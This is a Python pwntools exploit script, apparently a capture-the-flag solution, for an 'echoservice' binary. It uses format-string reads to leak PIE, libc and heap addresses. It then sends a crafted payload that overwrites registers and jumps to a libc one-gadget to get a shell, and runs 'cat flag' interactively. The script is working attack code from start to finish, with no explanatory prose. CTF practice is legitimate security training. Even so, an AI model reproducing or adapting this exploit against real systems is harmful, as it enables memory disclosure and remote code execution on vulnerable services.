#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "echo.stillhackinganyway.nl"
PORT = 1337

def readValue(param):
	r.sendline("%%%d$p" % (param))
	r.recvuntil("]")

	LEAK = int(r.recvline().strip(), 16)

	return LEAK

def exploit(r):
	log.info("Leak PIE address")

	PIELEAK = readValue(6)
	PIE = PIELEAK - 0x2023a0
	
	log.info("Leak LIBC address")	
	
	LIBCLEAK = readValue(1)
	LIBC = LIBCLEAK - 0x3c4b40
	BINSH = LIBC + 0x18cd17
	
	log.info("Leak HEAP address")

	HEAPLEAK = readValue(4)
	HEAPBASE = HEAPLEAK - 0x93cc8 + 0x28
		
	log.info("PIE leak       : %s" % hex(PIELEAK))
	log.info("PIE base       : %s" % hex(PIE))
	log.info("LIBC leak      : %s" % hex(LIBCLEAK))
	log.info("LIBC base      : %s" % hex(LIBC))
	log.info("HEAP leak      : %s" % hex(HEAPLEAK))
	log.info("HEAP base      : %s" % hex(HEAPBASE))

	ONE = LIBC + 0x4526a
	CALLREAD = PIE + 0xF92
	HEAPBASE = HEAPLEAK - (1139*1000)-72#

	log.info("Calling read function to create new stack frame")

	payload = "%13$@   "
	payload += p64(HEAPBASE+0x28)   # RDI	
	payload += "A"*(8*5)			
	payload += p64(HEAPBASE+0x20)   # RBP  
	payload += "B"*48
	payload += p64(HEAPBASE+0x76)   # RDX	
	payload += "A"*14
	payload += p64(HEAPBASE+0x76)   # R8 
	payload += "B"*16
	payload += p64(HEAPBASE+0x20)   # RAX 
	payload += "CC"	
	payload += p64(ONE)*5           # RIP 

	r.sendline(payload)

	r.sendline("cat flag")

	r.interactive()


if __name__ == "__main__":	
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:	
		LOCAL = True
		r = process("/echoservice", env={"LD_PRELOAD":"./libc.so.6"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
